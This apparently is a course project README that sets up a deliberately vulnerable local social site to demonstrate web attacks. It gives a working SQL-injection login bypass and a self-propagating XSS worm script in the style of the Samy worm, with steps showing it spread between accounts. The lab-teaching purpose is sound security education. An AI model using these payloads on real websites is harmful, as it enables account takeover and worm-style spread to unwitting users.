# ECE-5590-Attack-Reproduction

Objective: Malicious code in websites

Part 1: Build a simple dummy social networking site and use it to demonstrate SQL injection Links to an external site., XSS Links to an external site., and CSRF Links to an external site. vulnerabilities.

Part 2: Construct an XSS worm Links to an external site. to attack your site, like the Samy worm Links to an external site. that infected MySpace.

Part 3: Implement defenses against each threat. Bonus challenge: Discover an undocumented XSS vulnerability in a popular website.



## Steps


# Setup DB

```
python setup_db.py
```


# Start Website

```
python app.py
```
The site comes with 3 accounts with the following credentials:

- `admin:admin`
- `bob:bob`
- `alice:alice`

Additional accounts can be created

Register a user with the following
- Username: >username<
- Password: >password<

Log in with these credentials

# SQL injection

Go to login page and append `' --` to the username, for example:
- Username: `admin' --`
- Password: >any<

This logs you in as admin without needing the password


# XSS Worm Example

1) Login as alice (alice:alice)

2) Create a post with the following:
```
<script>
fetch('/post', {  // Sends request to create new post on website
    method: 'POST',  // Use the HTTP POST method to send data
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },  // Set the request content type

    // The body of the request contains the post content.
    body: 'content=' + encodeURIComponent('Alice is the best <scr' + 'ipt>' + 
        'fetch("/post", {' +
        'method: "POST",' +
        'headers: {"Content-Type": "application/x-www-form-urlencoded"},' +
        'body: "content=" + encodeURIComponent(\'Alice is the best <scr\'+\'ipt>\' + document.currentScript.outerHTML + \'</scr\'+\'ipt>\')' +
        '});' +
        '</scr' + 'ipt>')
});
</script>
I'm the best! // what users will see
```

3) Logout
4) Log in to bob's account (bob:bob)
5) View global feed as bob, to see alice's post
6) Logout
7) Log back in to alice
8) View global post, see that bob has reposted alice's post.

